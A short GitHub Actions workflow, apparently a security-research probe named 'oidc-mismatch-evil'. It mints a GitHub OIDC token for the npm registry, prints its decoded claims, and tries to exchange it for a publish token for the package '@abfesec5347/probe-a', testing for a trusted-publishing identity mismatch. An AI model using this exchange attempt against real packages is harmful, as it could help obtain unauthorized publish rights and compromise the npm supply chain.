name: oidc-mismatch-evil
on:
  workflow_dispatch: {}
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: mint and exchange
        run: |
          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=npm:registry.npmjs.org" \
            | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          echo "TOKEN_LEN=${#TOKEN}"
          python3 - "$TOKEN" <<'PY'
          import sys,base64,json
          p=sys.argv[1].split('.')[1]; p+='='*(-len(p)%4)
          d=json.loads(base64.urlsafe_b64decode(p))
          keys=('iss','aud','sub','repository','repository_owner','workflow_ref','job_workflow_ref','ref')
          print('CLAIMS='+json.dumps({k:d[k] for k in keys if k in d}))
          PY
          curl -sS -o /tmp/r.json -w 'EXCHANGE_STATUS=%{http_code}\n' \
            -X POST -H "Authorization: Bearer $TOKEN" -H 'content-type: application/json' \
            'https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/%40abfesec5347%2Fprobe-a'
          echo "BODY=$(head -c 300 /tmp/r.json)"
